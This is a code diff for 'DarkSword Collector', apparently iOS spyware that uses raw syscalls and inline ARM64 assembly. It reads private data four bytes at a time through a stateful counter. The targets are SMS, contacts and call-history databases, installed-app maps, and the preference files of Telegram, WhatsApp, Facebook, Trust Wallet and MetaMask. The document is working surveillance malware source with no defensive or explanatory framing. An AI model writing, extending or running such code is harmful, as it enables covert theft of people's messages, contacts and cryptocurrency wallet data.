@@ -1,5 +1,6 @@
 /**
- * DarkSword Collector v40 - Minimal dir enumeration (256B buffer)
+ * DarkSword Collector v41 - Read MobileInstallation map + app data
+ * No getdirentries — uses only open/read/close which are proven stable
  */
 
 static long _svc1(long n, long a) {
@@ -20,45 +21,67 @@ static long _svc4(long n, long a, long b, long c, long d) {
 }
 
 #define SYS_open 5
+#define SYS_read 3
 #define SYS_close 6
-#define SYS_getdirentries 196
+#define SYS_lseek 199
+#define SEEK_SET 0
 #define O_RDONLY 0
 
+#define NUM_FILES 10
+#define CHUNKS_PER_FILE 8
+
+static volatile int g_ctx = 0;
+
+static const char *get_path(int id) {
+    switch (id) {
+        /* MobileInstallation maps */
+        case 0: return "/var/mobile/Library/MobileInstallation/LastLaunchServicesMap.plist";
+        case 1: return "/var/mobile/Library/MobileInstallation/InstallationPromotionAssets.plist";
+        /* App preference plists with larger read */
+        case 2: return "/var/mobile/Library/Preferences/ph.telegra.Telegraph.plist";
+        case 3: return "/var/mobile/Library/Preferences/net.whatsapp.WhatsApp.plist";
+        case 4: return "/var/mobile/Library/Preferences/com.facebook.Facebook.plist";
+        case 5: return "/var/mobile/Library/Preferences/com.sixdays.trustwallet.plist";
+        case 6: return "/var/mobile/Library/Preferences/io.metamask.MetaMask.plist";
+        /* Key system files */
+        case 7: return "/var/mobile/Library/SMS/sms.db";
+        case 8: return "/var/mobile/Library/AddressBook/AddressBook.sqlitedb";
+        case 9: return "/var/mobile/Library/CallHistoryDB/CallHistory.storedata";
+        default: return (void*)0;
+    }
+}
+
 int ds_start(void) {
-    int fd = (int)_svc2(SYS_open, (long)"/var/mobile/Containers/Data/Application/", O_RDONLY);
-    if (fd < 0) return 0xFE000000;
+    int ctx;
+    __asm__("ldr %w0, [%1]" : "=r"(ctx) : "r"(&g_ctx));
+    int fid = (ctx >> 16) & 0xFF;
+    int chk = ctx & 0xFF;
 
-    /* Small stack buffer - just enough for a few entries */
-    unsigned char buf[256];
-    for (int i = 0; i < 256; i++) buf[i] = 0;
-    long basep = 0;
-    int nread = (int)_svc4(SYS_getdirentries, fd, (long)buf, 256, (long)&basep);
-    _svc1(SYS_close, fd);
-
-    if (nread < 1) return 0xEE000000;
-
-    /* Count entries, get first non-dot entry info */
-    int pos = 0;
-    int count = 0;
-    unsigned char first_byte = 0;
-    unsigned short first_namlen = 0;
-
-    while (pos < nread && pos < 240) {
-        unsigned short reclen = *(unsigned short *)(buf + pos + 8);
-        unsigned short namlen = *(unsigned short *)(buf + pos + 10);
-        if (reclen < 12 || reclen > 256) break;
-
-        unsigned char c = buf[pos + 12]; /* first char of d_name */
-        if (!(namlen == 1 && c == '.') && !(namlen == 2 && c == '.')) {
-            count++;
-            if (count == 1) {
-                first_byte = c;
-                first_namlen = namlen;
-            }
-        }
-        pos += reclen;
+    if (fid >= NUM_FILES) {
+        __asm__("str %w0, [%1]" : : "r"(0), "r"(&g_ctx));
+        return 0xFFFFFFFF;
+    }
+    if (chk >= CHUNKS_PER_FILE) {
+        int nc = ((fid + 1) << 16);
+        __asm__("str %w0, [%1]" : : "r"(nc), "r"(&g_ctx));
+        return 0xFF000000 | fid;
     }
 
-    /* Return: count(8) | namlen(8) | first_byte(8) | reserved(8) */
-    return (count & 0xFF) | ((first_namlen & 0xFF) << 8) | ((first_byte & 0xFF) << 16);
+    const char *path = get_path(fid);
+    if (!path) { int nc = (fid + 1) << 16; __asm__("str %w0, [%1]" : : "r"(nc), "r"(&g_ctx)); return 0xFD000000 | fid; }
+
+    int fd = (int)_svc2(SYS_open, (long)path, O_RDONLY);
+    if (fd < 0) { int nc = (fid + 1) << 16; __asm__("str %w0, [%1]" : : "r"(nc), "r"(&g_ctx)); return 0xFE000000 | fid; }
+
+    int off = chk * 4;
+    _svc4(SYS_lseek, fd, (long)off, SEEK_SET, 0);
+    unsigned char buf[4] = {0};
+    int n = (int)_svc3(SYS_read, fd, (long)buf, 4);
+    _svc1(SYS_close, fd);
+
+    int nc = (fid << 16) | (chk + 1);
+    __asm__("str %w0, [%1]" : : "r"(nc), "r"(&g_ctx));
+
+    if (n < 1) return 0xEE000000 | fid;
+    return (int)buf[0] | ((int)buf[1] << 8) | ((int)buf[2] << 16) | ((int)buf[3] << 24);
 }
